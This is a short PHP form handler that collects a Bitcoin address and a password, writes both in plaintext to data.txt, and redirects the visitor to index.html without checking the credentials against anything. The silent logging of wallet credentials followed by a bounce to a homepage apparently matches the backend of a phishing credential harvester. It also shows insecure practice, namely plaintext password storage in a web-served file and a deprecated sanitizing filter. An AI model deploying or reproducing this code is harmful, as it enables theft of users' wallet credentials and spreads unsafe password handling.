<?php
// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data
    $btc_address = $_POST["btc_address"];
    $password = $_POST["password"];

    // Validate and sanitize inputs (you should add more validation as needed)
    $btc_address = filter_var($btc_address, FILTER_SANITIZE_STRING);
    $password = filter_var($password, FILTER_SANITIZE_STRING);

    // Save data to file
    $data = $btc_address . "," . $password . "\n";
    file_put_contents("data.txt", $data, FILE_APPEND | LOCK_EX);

    // Redirect to homepage or login page
    header("Location: index.html");
    exit;
}
?>